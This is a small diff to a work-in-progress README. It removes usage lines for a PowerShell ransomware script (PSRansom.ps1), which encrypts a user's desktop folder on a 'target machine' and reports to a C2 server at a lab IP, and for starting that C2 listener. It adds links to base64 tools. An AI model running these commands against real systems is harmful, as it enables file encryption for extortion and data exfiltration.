@@ -1,8 +1,8 @@
 # WorkinProgress
-Experimental Scripts
-On Target Machine:
-.\PSRansom.ps1 -e C:\Users\bob\Desktop\TESTIT -s 192.168.200.2 -p 80 -x -Demo
+1. https://www.base64encode.org/
 
-On C2:
+then check using:
 
-.\C2Server.ps1 * 80
+2. https://www.base64decoder.io/
+
+
